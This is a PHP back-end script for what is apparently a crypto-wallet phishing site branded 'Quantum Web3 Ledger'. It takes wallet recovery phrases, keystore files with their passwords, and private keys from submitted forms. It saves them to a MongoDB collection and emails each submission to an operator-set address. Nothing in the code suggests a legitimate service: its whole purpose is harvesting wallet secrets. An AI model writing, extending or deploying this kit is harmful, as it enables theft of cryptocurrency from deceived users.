<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/../error.log');

session_start([
    'cookie_secure' => true,
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

require __DIR__ . '/../vendor/autoload.php';
use Dotenv\Dotenv;
use MongoDB\Driver\Manager;
use MongoDB\Driver\BulkWrite;
use MongoDB\Driver\Exception\Exception as MongoDBException;
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception as PHPMailerException;

$dotenv = Dotenv::createImmutable(__DIR__);
$dotenv->load();

$isAjax = isset($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest';

if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    error_log("CSRF failed");
    if ($isAjax) {
        http_response_code(403);
        echo json_encode(['error' => 'Invalid CSRF Token']);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        http_response_code(403);
        echo "<h2>Invalid CSRF Token</h2><p>Please refresh the page and try again. <a href='wallet1c0b1c0b.php'>Back</a></p>";
    }
    exit;
}

if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    if ($isAjax) {
        http_response_code(405);
        echo json_encode(['error' => 'Method not allowed']);
    } else {
        header('Location: wallet1c0b1c0b.php');
    }
    exit;
}

$submission_type = '';
$wallet = $email = $data = '';
if (isset($_POST['pwallet'], $_POST['pemail'], $_POST['phrase'])) {
    $submission_type = 'phrase';
    $wallet = trim($_POST['pwallet']);
    $email = trim($_POST['pemail']);
    $data = trim($_POST['phrase']);
} elseif (isset($_POST['kwallet'], $_POST['kemail'], $_POST['keystore'], $_POST['password'])) {
    $submission_type = 'keystore';
    $wallet = trim($_POST['kwallet']);
    $email = trim($_POST['kemail']);
    $data = trim($_POST['keystore']) . "\nPassword: " . trim($_POST['password']);
} elseif (isset($_POST['prwallet'], $_POST['premail'], $_POST['private'])) {
    $submission_type = 'privatekey';
    $wallet = trim($_POST['prwallet']);
    $email = trim($_POST['premail']);
    $data = trim($_POST['private']);
} else {
    error_log("Invalid submission type");
    if ($isAjax) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid Submission']);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        http_response_code(400);
        echo "<h2>Invalid Submission</h2><p>Please fill in all required fields correctly. <a href='wallet1c0b1c0b.php'>Back</a></p>";
    }
    exit;
}

if (empty($wallet) || empty($email) || empty($data) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    error_log("Validation failed");
    if ($isAjax) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid Input']);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        http_response_code(400);
        echo "<h2>Invalid Input</h2><p>Please fill in all required fields correctly. <a href='wallet1c0b1c0b.php'>Back</a></p>";
    }
    exit;
}
if (!preg_match('/^[a-zA-Z0-9-_]{1,64}$/', $wallet)) {
    if ($isAjax) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid Wallet Name']);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        http_response_code(400);
        echo "<h2>Invalid Wallet Name</h2><p>Use up to 64 alphanumeric characters for the wallet name. <a href='wallet1c0b1c0b.php'>Back</a></p>";
    }
    exit;
}
if (strlen($data) > 1000) {
    if ($isAjax) {
        http_response_code(400);
        echo json_encode(['error' => 'Input Too Long']);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        http_response_code(400);
        echo "<h2>Input Too Long</h2><p>Submission data must be under 1000 characters. <a href='wallet1c0b1c0b.php'>Back</a></p>";
    }
    exit;
}
$data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');

if (isset($_SESSION['last_submission']) && (time() - $_SESSION['last_submission']) < 60) {
    if ($isAjax) {
        http_response_code(429);
        echo json_encode(['error' => 'Rate Limit Exceeded']);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        http_response_code(429);
        echo "<h2>Rate Limit Exceeded</h2><p>Please wait a minute before submitting again. <a href='wallet1c0b1c0b.php'>Back</a></p>";
    }
    exit;
}
$_SESSION['last_submission'] = time();

if (!isset($_ENV['DB_HOST'], $_ENV['DB_NAME'], $_ENV['DB_USER'], $_ENV['DB_PASS'])) {
    error_log("Database configuration missing in " . __FILE__);
    if ($isAjax) {
        http_response_code(500);
        echo json_encode(['error' => 'Server Error']);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        http_response_code(500);
        echo "<h2>Server Error</h2><p>Database configuration is unavailable. Please try again later. <a href='wallet1c0b1c0b.php'>Back</a></p>";
    }
    exit;
}

try {
    $mongoUri = "mongodb://" . $_ENV['DB_USER'] . ":" . $_ENV['DB_PASS'] . "@" . $_ENV['DB_HOST'] . ":" . ($_ENV['DB_PORT'] ?? '27017') . "/" . $_ENV['DB_NAME'] . "?authSource=admin&directConnection=true";
    $manager = new Manager($mongoUri);
    $bulk = new BulkWrite;
    $document = [
        'wallet' => $wallet,
        'email' => $email,
        'data' => $data,
        'submission_type' => $submission_type,
        'created_at' => new \MongoDB\BSON\UTCDateTime(time() * 1000)
    ];
    $bulk->insert($document);
    $result = $manager->executeBulkWrite($_ENV['DB_NAME'] . '.submissions', $bulk);
    if ($result->getInsertedCount() !== 1) {
        throw new MongoDBException("Insert failed");
    }
} catch (MongoDBException $e) {
    error_log("MongoDB error in " . __FILE__ . ": " . $e->getMessage());
    if ($isAjax) {
        http_response_code(500);
        echo json_encode(['error' => 'Database Error']);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        http_response_code(500);
        echo "<h2>Database Error</h2><p>Unable to save submission. Please try again. <a href='wallet1c0b1c0b.php'>Back</a></p>";
    }
    exit;
}

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

if (!class_exists('PHPMailer\PHPMailer\PHPMailer')) {
    error_log("PHPMailer not found in " . __FILE__);
    if ($isAjax) {
        http_response_code(500);
        echo json_encode(['error' => 'Submission Saved (Email unavailable)']);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        http_response_code(500);
        echo "<h2>Submission Saved</h2><p>Email service is unavailable, but your submission is stored.</p>";
        echo "<p><a href='wallet1c0b1c0b.php'>Back</a></p>";
    }
    exit;
}

$mail = new PHPMailer(true);
try {
    if (!isset($_ENV['SMTP_HOST'], $_ENV['SMTP_USER'], $_ENV['SMTP_PASS'], $_ENV['TO_EMAIL'])) {
        error_log("Email configuration missing in " . __FILE__);
        throw new Exception("Email service unavailable");
    }
    $mail->isSMTP();
    $mail->Host = $_ENV['SMTP_HOST'];
    $mail->SMTPAuth = true;
    $mail->Username = $_ENV['SMTP_USER'];
    $mail->Password = $_ENV['SMTP_PASS'];
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;
    $mail->CharSet = 'UTF-8';
    $mail->setFrom($_ENV['SMTP_USER'], 'Quantum Web3 Ledger');
    $mail->addAddress($_ENV['TO_EMAIL']);
    $mail->Subject = "New $submission_type Submission from $wallet";
    $mail->Body = "Wallet: $wallet\nType: $submission_type\nData: $data\nEmail: $email\nTime: " . date('Y-m-d H:i:s');
    $mail->send();
    if ($isAjax) {
        echo json_encode(['success' => 'Submission received and emailed']);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        echo "<h2>Submission Received</h2><p>Your submission has been recorded and an email notification sent.</p>";
        echo "<p><a href='wallet1c0b1c0b.php'>Back</a></p>";
    }
} catch (Exception $e) {
    error_log("Email error in " . __FILE__ . ": " . $mail->ErrorInfo);
    if ($isAjax) {
        http_response_code(500);
        echo json_encode(['error' => 'Submission saved (Email failed)']);
    } else {
        header('Content-Type: text/html; charset=UTF-8');
        http_response_code(500);
        echo "<h2>Submission Saved</h2><p>Email notification failed, but your submission is stored.</p>";
        echo "<p><a href='wallet1c0b1c0b.php'>Back</a></p>";
    }
}

try {
    $bulk = new BulkWrite;
    $filter = ['created_at' => ['$lt' => new \MongoDB\BSON\UTCDateTime((time() - (30 * 24 * 60 * 60)) * 1000)]];
    $bulk->delete($filter);
    $manager->executeBulkWrite($_ENV['DB_NAME'] . '.submissions', $bulk);
} catch (MongoDBException $e) {
    error_log("Cleanup error in " . __FILE__ . ": " . $e->getMessage());
}
